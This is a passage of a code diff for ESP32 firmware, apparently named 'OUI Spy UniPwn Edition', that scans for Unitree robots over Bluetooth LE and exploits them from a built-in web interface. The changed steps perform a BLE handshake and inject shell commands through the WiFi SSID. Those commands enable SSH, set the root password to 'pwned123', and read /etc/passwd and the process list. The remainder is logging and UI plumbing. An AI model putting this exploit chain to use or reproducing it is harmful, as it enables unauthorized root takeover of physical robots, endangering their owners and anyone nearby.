+                        case 1: // BLE Connect + Handshake
+                            addLog('Connecting to BLE and performing handshake...', 'info');
+                            const handshakeResponse = await fetchWithTimeout('/handshake?target=' + encodeURIComponent(selectedDevice.address), timeout, {
+                                method: 'POST'
                             });
                             
                             if (!handshakeResponse.ok) {
                                 const errorText = await handshakeResponse.text();
-                                throw new Error('Handshake failed: HTTP ' + handshakeResponse.status + ' - ' + errorText);
+                                throw new Error('BLE connection/handshake failed: HTTP ' + handshakeResponse.status + ' - ' + errorText);
                             }
                             
                             const handshakeResult = await handshakeResponse.json();
                             if (!handshakeResult.success) {
-                                throw new Error('Handshake rejected by target: ' + (handshakeResult.error || 'Unknown error'));
+                                throw new Error('BLE handshake rejected: ' + (handshakeResult.error || 'Unknown error'));
                             }
                             
-                            addLog('BLE handshake COMPLETED - Protocol established successfully', 'success');
+                            addLog('BLE connection and handshake COMPLETED successfully', 'success');
                             return true;
                             
-                        case 3: // WiFi Injection
-                            addLog('Injecting malicious WiFi configuration...', 'info');
-                            const wifiPayload = '\\";echo \\"PWNED_$(whoami)_$(date +%s)\\" > /tmp/unipwn.log;#';
+                        case 2: // WiFi Injection
+                            addLog('Injecting command via SSID (UniPwn method)...', 'info');
+                            const wifiPayload = 'echo "PWNED_$(whoami)_$(date +%s)" > /tmp/unipwn.log';
                             
                             const wifiResponse = await fetchWithTimeout('/exploit', timeout, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    address: selectedDevice.address,
-                                    command: wifiPayload,
-                                    method: 'ssid'
+                                    target: selectedDevice.address,
+                                    command: wifiPayload
                                 })
                             });
                             
@@ -1297,7 +1492,7 @@ const char* webPageHTML = R"rawliteral(
                             addLog('WiFi injection SUCCESSFUL - Command payload delivered', 'success');
                             return true;
                             
-                        case 4: // SSH Enable
+                        case 3: // SSH Enable
                             addLog('Enabling SSH daemon on target...', 'info');
                             const sshCommand = 'systemctl enable ssh && systemctl start ssh && echo "SSH_ENABLED_$(date +%s)" >> /tmp/unipwn.log';
                             
@@ -1305,7 +1500,7 @@ const char* webPageHTML = R"rawliteral(
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    address: selectedDevice.address,
+                                    target: selectedDevice.address,
                                     command: sshCommand,
                                     method: 'ssid'
                                 })
@@ -1324,7 +1519,7 @@ const char* webPageHTML = R"rawliteral(
                             addLog('SSH daemon ENABLED - Remote access now available', 'success');
                             return true;
                             
-                        case 5: // Root Access
+                        case 4: // Root Access
                             addLog('Compromising root account...', 'info');
                             const rootCommand = 'echo "root:pwned123" | chpasswd && echo "ROOT_PWNED_$(date +%s)" >> /tmp/unipwn.log && passwd -u root';
                             
@@ -1332,7 +1527,7 @@ const char* webPageHTML = R"rawliteral(
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    address: selectedDevice.address,
+                                    target: selectedDevice.address,
                                     command: rootCommand,
                                     method: 'ssid'
                                 })
@@ -1351,7 +1546,7 @@ const char* webPageHTML = R"rawliteral(
                             addLog('ROOT ACCESS GAINED - Password changed to: pwned123', 'success');
                             return true;
                             
-                        case 6: // System Extract
+                        case 5: // System Extract
                             addLog('Extracting critical system information...', 'info');
                             const extractCommand = 'uname -a && cat /etc/passwd | head -10 && ps aux | head -10 && cat /tmp/unipwn.log 2>/dev/null || echo "No log found"';
                             
@@ -1359,7 +1554,7 @@ const char* webPageHTML = R"rawliteral(
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    address: selectedDevice.address,
+                                    target: selectedDevice.address,
                                     command: extractCommand,
                                     method: 'ssid'
                                 })
@@ -1422,6 +1617,78 @@ const char* webPageHTML = R"rawliteral(
         function updateProgress(percent, text) {
             document.getElementById('progressBar').style.width = percent + '%';
             document.getElementById('progressText').textContent = percent + '% - ' + text;
+        }
+        
+        function addAutoPwnStep(stepNumber, stepName, status = 'pending') {
+            const stepsList = document.getElementById('stepsList');
+            const timestamp = new Date().toLocaleTimeString();
+            let statusColor = '#cccccc'; // pending
+            let statusText = 'PENDING';
+            
+            if (status === 'running') {
+                statusColor = '#ffff32';
+                statusText = 'RUNNING';
+            } else if (status === 'success') {
+                statusColor = '#32ff32';
+                statusText = 'SUCCESS';
+            } else if (status === 'failed') {
+                statusColor = '#ff3232';
+                statusText = 'FAILED';
+            }
+            
+            const stepDiv = document.createElement('div');
+            stepDiv.id = 'step-' + stepNumber;
+            stepDiv.style.marginBottom = '5px';
+            stepDiv.style.padding = '3px 5px';
+            stepDiv.style.borderRadius = '3px';
+            stepDiv.style.backgroundColor = status === 'running' ? 'rgba(255,255,50,0.1)' : 
+                                           status === 'success' ? 'rgba(50,255,50,0.1)' : 
+                                           status === 'failed' ? 'rgba(255,50,50,0.1)' : 'rgba(255,255,255,0.05)';
+            
+            stepDiv.innerHTML = `<span style="color: #ffffff;">${timestamp}</span> ` +
+                               `<span style="color: ${statusColor}; font-weight: bold;">[${statusText}]</span> ` +
+                               `<span style="color: #ffffff;">Step ${stepNumber}: ${stepName}</span>`;
+            
+            stepsList.appendChild(stepDiv);
+            stepsList.scrollTop = stepsList.scrollHeight;
+        }
+        
+        function updateAutoPwnStep(stepNumber, status, errorMessage = '') {
+            const stepDiv = document.getElementById('step-' + stepNumber);
+            if (stepDiv) {
+                let statusColor = '#cccccc';
+                let statusText = 'PENDING';
+                
+                if (status === 'running') {
+                    statusColor = '#ffff32';
+                    statusText = 'RUNNING';
+                } else if (status === 'success') {
+                    statusColor = '#32ff32';
+                    statusText = 'SUCCESS';
+                } else if (status === 'failed') {
+                    statusColor = '#ff3232';
+                    statusText = 'FAILED';
+                }
+                
+                const timestamp = new Date().toLocaleTimeString();
+                const originalText = stepDiv.innerHTML.split('Step ' + stepNumber + ': ')[1];
+                stepDiv.innerHTML = `<span style="color: #ffffff;">${timestamp}</span> ` +
+                                   `<span style="color: ${statusColor}; font-weight: bold;">[${statusText}]</span> ` +
+                                   `<span style="color: #ffffff;">Step ${stepNumber}: ${originalText}</span>`;
+                
+                if (errorMessage) {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.style.marginLeft = '20px';
+                    errorDiv.style.color = '#ff3232';
+                    errorDiv.style.fontSize = '11px';
+                    errorDiv.textContent = 'ERROR: ' + errorMessage;
+                    stepDiv.appendChild(errorDiv);
+                }
+                
+                stepDiv.style.backgroundColor = status === 'running' ? 'rgba(255,255,50,0.1)' : 
+                                               status === 'success' ? 'rgba(50,255,50,0.1)' : 
+                                               status === 'failed' ? 'rgba(255,50,50,0.1)' : 'rgba(255,255,255,0.05)';
+            }
         }
         
         function sleep(ms) {
@@ -1497,51 +1764,62 @@ const char* webPageHTML = R"rawliteral(
                 isScanning = true;
             }
             
-            addLog('CONTINUOUS SCANNING: Starting 30-second cycle', 'ble');
+            addLog('CONTINUOUS SCANNING: Started - will run until stopped', 'ble');
             scanDevices();
+            saveState(); // Persist scan state
             
-            // Schedule next scan in 30 seconds
-            continuousTimer = setTimeout(() => {
-                if (isScanning) {
-                    addLog('CONTINUOUS SCAN: Next 30-second cycle starting', 'scan');
-                    startContinuousScanning();
-                }
-            }, 30000); // 30 seconds
+            // No more 30-second cycles - just let it run continuously
+            // The scanDevices() function handles the continuous polling internally
         }
 
         // Initialize on load
+        // Global error handler
+        window.onerror = function(msg, url, line, col, error) {
+            console.error('JavaScript Error:', msg, 'at', line + ':' + col);
+            addLog('JavaScript Error: ' + msg + ' at line ' + line, 'error');
+            return false;
+        };
+        
+        window.addEventListener('unhandledrejection', function(event) {
+            console.error('Unhandled Promise Rejection:', event.reason);
+            addLog('Promise Error: ' + event.reason, 'error');
+        });
+        
         document.addEventListener('DOMContentLoaded', function() {
             // Page loaded, get system info (DON'T clear targets on refresh)
             
             addLog('OUI Spy UniPwn Edition - Based on github.com/Bin4ry/UniPwn research', 'info');
             addLog('Ready for Unitree robot BLE exploitation', 'info');
             addLog('Page loaded - targets persist on refresh', 'info');
+            
+            // Clear legacy selectedDevice key and reset UI selection
+            try { localStorage.removeItem('selectedDevice'); } catch (e) {}
+            const sel = document.getElementById('selectedTarget');
+            if (sel) {
+                sel.innerHTML = 'No target selected - Click a robot above to select';
+                sel.style.borderColor = '#ff6b6b';
+                sel.style.backgroundColor = 'rgba(255, 107, 107, 0.1)';
+                sel.style.color = '#ff6b6b';
+            }
+            // Reset scan status on page load
+            document.getElementById('scanStatus').innerHTML = '<span style="color: #cccccc;">Ready to scan for Unitree robots</span>';
+            
+            // Load comprehensive state from localStorage
+            const stateRestored = loadState();
+            if (!stateRestored) {
+                addLog('Starting fresh session - no previous state found', 'info');
+            }
+            
+            // Start real-time operations log polling
+            startSerialPolling();
+            addLog('Real-time operations log active', 'success');
             getSystemInfo();
             setInterval(getSystemInfo, 10000);
 
-            // Always-on lightweight background polling to catch FIRST detections instantly
-            if (!backgroundPoll) {
-                backgroundPoll = setInterval(() => {
-                    fetch('/poll')
-                        .then(r => r.json())
-                        .then(data => {
-                            console.log('Background poll data:', data);
-                            if (data && data.devices && data.devices.length > 0) {
-                                console.log('Immediate update: Populating targets with', data.devices.length, 'devices');
-                                
-                                // Hot pink detection logging for background discoveries
-                                data.devices.forEach((device, index) => {
-                                    addLog('BACKGROUND DETECT: ' + device.name + ' [' + device.address + '] RSSI: ' + device.rssi + 'dBm', 'detection');
-                                    if (device.uuid && device.uuid !== 'N/A') {
-                                        addLog('└─ UUID: ' + device.uuid, 'uuid');
-                                    }
-                                });
-                                
-                                showTargets(data.devices);
-                            }
-                        })
-                        .catch(() => console.log('Poll failed'));
-                }, 100);  // Boosted to 100ms for immediate first detection
+            // Disable background pre-scan polling to avoid stale detections from prior sessions
+            if (backgroundPoll) {
+                clearInterval(backgroundPoll);
+                backgroundPoll = null;
             }
             
             // Serial log mirroring - fetch and display serial output in operations log
@@ -1551,7 +1829,7 @@ const char* webPageHTML = R"rawliteral(
                     .then(data => {
                         if (data.success && data.serial) {
                             const logOutput = document.getElementById('logOutput');
-                            const lines = data.serial.split('\\\\n').filter(line => line.trim());
+                            const lines = data.serial.split('\\<br>').filter(line => line.trim());
                             
                             // Process each line with color coding
                             lines.forEach(line => {
@@ -1574,7 +1852,7 @@ const char* webPageHTML = R"rawliteral(
                                 }
                                 
                                 // Add to log with proper formatting
-                                logOutput.value += timestamp + ' [SERIAL] ' + line + '\\n';
+                                logOutput.value += timestamp + ' [SERIAL] ' + line + '<br>';
                             });
                             
                             logOutput.scrollTop = logOutput.scrollHeight;
@@ -1729,9 +2007,35 @@ void handleStatus() {
     webServer.send(200, "application/json", json);
 }
 
+void handleHandshake() {
+    if (!webServer.hasArg("target")) {
+        webServer.send(400, "application/json", "{\"success\":false,\"error\":\"Missing target\"}");
+        return;
+    }
+    String addr = webServer.arg("target");
+    int targetIndex = -1;
+    for (int i = 0; i < discoveredDevices.size(); i++) {
+        if (discoveredDevices[i].address.equals(addr)) { targetIndex = i; break; }
+    }
+    if (targetIndex == -1) {
+        webServer.send(404, "application/json", "{\"success\":false,\"error\":\"Target not found\"}");
+        return;
+    }
+    bool ok = performHandshake(discoveredDevices[targetIndex]);
+    if (ok) {
+        webServer.send(200, "application/json", "{\"success\":true}");
+    } else {
+        webServer.send(500, "application/json", "{\"success\":false,\"error\":\"Handshake failed\"}");
+    }
+}
+
 void handleSerial() {
+    // Return the actual serial log buffer for display in operations log
     String json = "{\"success\": true, \"serial\": \"" + serialLogBuffer + "\"}";
     webServer.send(200, "application/json", json);
+    
+    // Clear buffer after sending to prevent duplicate entries
+    serialLogBuffer = "";
 }
 
 void handleNotFound() {
@@ -1788,47 +2092,59 @@ void handleToggle() {
 
 // Function to mirror serial output to web operations log
 void mirrorSerialToWeb(const String& message) {
-    if (skipMenuOutput) {
-        // Skip menu-related output
-        if (message.indexOf("=== OUI Spy UniPwn Menu ===") != -1 ||
-            message.indexOf("1. Use web app") != -1 ||
-            message.indexOf("2. Show recent") != -1 ||
-            message.indexOf("3. Connect and") != -1 ||
-            message.indexOf("4. Toggle verbose") != -1 ||
-            message.indexOf("5. Show attack") != -1 ||
-            message.indexOf("6. System information") != -1 ||
-            message.indexOf("7. Web interface") != -1 ||
-            message.indexOf("8. Toggle buzzer") != -1 ||
-            message.indexOf("9. Toggle LED") != -1 ||
-            message.indexOf("Enter choice:") != -1) {
-            return;
-        }
-        
-        // Stop skipping after first scan or BLE activity
-        if (message.indexOf("Scanning for") != -1 || 
-            message.indexOf("BLE Device:") != -1 ||
-            message.indexOf("Found:") != -1) {
-            skipMenuOutput = false;
-        }
+    // Skip ALL menu-related output - we only want actual serial content
+    if (message.indexOf("=== OUI Spy UniPwn Menu ===") != -1 ||
+        message.indexOf("1. Use web app") != -1 ||
+        message.indexOf("2. Show recent") != -1 ||
+        message.indexOf("3. Connect and") != -1 ||
+        message.indexOf("4. Toggle verbose") != -1 ||
+        message.indexOf("5. Show attack") != -1 ||
+        message.indexOf("6. System information") != -1 ||
+        message.indexOf("7. Web interface") != -1 ||
+        message.indexOf("8. Toggle buzzer") != -1 ||
+        message.indexOf("9. Toggle LED") != -1 ||
+        message.indexOf("Enter choice:") != -1 ||
+        message.indexOf("Available devices:") != -1 ||
+        message.indexOf("Select device") != -1) {
+        return;
     }
     
-    // Clean message (remove ANSI escape codes)
+    // Skip background spam messages
+    if (message.indexOf("TARGETS DISPLAYED:") != -1 ||
+        message.indexOf("showTargets completed") != -1 ||
+        message.indexOf("Creating button for device:") != -1 ||
+        message.indexOf("Button clicked for:") != -1 ||
+        message.indexOf("Device object:") != -1 ||
+        message.indexOf("=== TARGET SELECTION ===") != -1 ||
+        message.indexOf("selectDevice called with:") != -1 ||
+        message.indexOf("Device name:") != -1 ||
+        message.indexOf("Device address:") != -1 ||
+        message.indexOf("Device UUID:") != -1 ||
+        message.indexOf("selectedDevice set to:") != -1 ||
+        message.indexOf("Updating target display element") != -1) {
+        return;
+    }
+    
+    // Clean message and determine type for proper web log formatting
     String cleanMessage = message;
     cleanMessage.replace("\033[1;95m", "");  // Remove hot pink
+    cleanMessage.replace("\033[1;32m", "");  // Remove bold green
+    cleanMessage.replace("\033[1;31m", "");  // Remove bold red
+    cleanMessage.replace("\033[1;33m", "");  // Remove bold yellow
+    cleanMessage.replace("\033[1;34m", "");  // Remove bold blue
+    cleanMessage.replace("\033[1;36m", "");  // Remove bold cyan
     cleanMessage.replace("\033[0m", "");     // Remove reset
     cleanMessage.replace("\033[41;1;37m", ""); // Remove red background
-    cleanMessage.replace("\033[32m", "");    // Remove green
-    cleanMessage.replace("\033[31m", "");    // Remove red
     
-    // Add to serial log buffer with proper formatting
-    serialLogBuffer += cleanMessage + "\\n";  // Double backslash for JavaScript
+    // Just store the clean serial output directly - same as USB UART
+    serialLogBuffer += cleanMessage + "<br>";
     
-    // Keep buffer manageable (last 100 lines for more context)
-    int lineCount = 0;
+    // Keep buffer manageable (last 50 commands)
+    int commandCount = 0;
     for (int i = serialLogBuffer.length() - 1; i >= 0; i--) {
-        if (serialLogBuffer.substring(i, i+2) == "\\n") {
-            lineCount++;
-            if (lineCount > 100) {
+        if (serialLogBuffer.substring(i, i+2) == "<br>") {
+            commandCount++;
+            if (commandCount > 50) {
                 serialLogBuffer = serialLogBuffer.substring(i + 2);
                 break;
             }
@@ -1841,8 +2157,14 @@ void notifyWebInterfaceNewTarget(const UnitreeDevice& device) {
     // Hot pink highlighting for immediate detection
     Serial.println("\n\033[1;95m[WEB] TARGET DETECTED: " + device.name + " [" + device.address + "] (" + String(device.rssi) + "dBm)\033[0m");
     
+    // UUID info only (detection already logged immediately in onResult)
+    if (device.uuid != "NO_SERVICES" && device.uuid.length() > 0) {
+        String uuidLog = "└─ UUID: " + device.uuid;
+        serialLogBuffer += uuidLog + "<br>";
+    }
+    
     // Send immediate JSON update with current discovered devices
-    String json = "{\"success\": true, \"realtime\": true, \"devices\": [";
+    String json = "{\"success\": true, \"realtime\": true, \"immediate\": true, \"devices\": [";
     
     for (int i = 0; i < discoveredDevices.size(); i++) {
         if (i > 0) json += ",";
@@ -1876,6 +2198,25 @@ void setupWebInterface() {
     webServer.on("/poll", HTTP_GET, handlePoll);  // Real-time polling endpoint
     webServer.on("/serial", HTTP_GET, handleSerial);  // Serial debug logs endpoint
     webServer.on("/exploit", HTTP_POST, handleExploit);
+    webServer.on("/handshake", HTTP_POST, [](){
+        if (!webServer.hasArg("target")) {
+            webServer.send(400, "application/json", "{\"success\":false,\"error\":\"Missing target\"}");
+            return;
+        }
+        String body = webServer.arg("plain");
+        String target = webServer.arg("target");
+        int idx = -1;
+        for (int i = 0; i < discoveredDevices.size(); i++) {
+            if (discoveredDevices[i].address.equals(target)) { idx = i; break; }
+        }
+        if (idx == -1) {
+            webServer.send(404, "application/json", "{\"success\":false,\"error\":\"Target not found\"}");
+            return;
+        }
+        bool ok = performHandshake(discoveredDevices[idx]);
+        if (ok) webServer.send(200, "application/json", "{\"success\":true}");
+        else webServer.send(500, "application/json", "{\"success\":false,\"error\":\"Handshake failed\"}");
+    });
     webServer.on("/status", handleStatus);
     webServer.on("/toggle", HTTP_POST, handleToggle);
     webServer.onNotFound(handleNotFound);
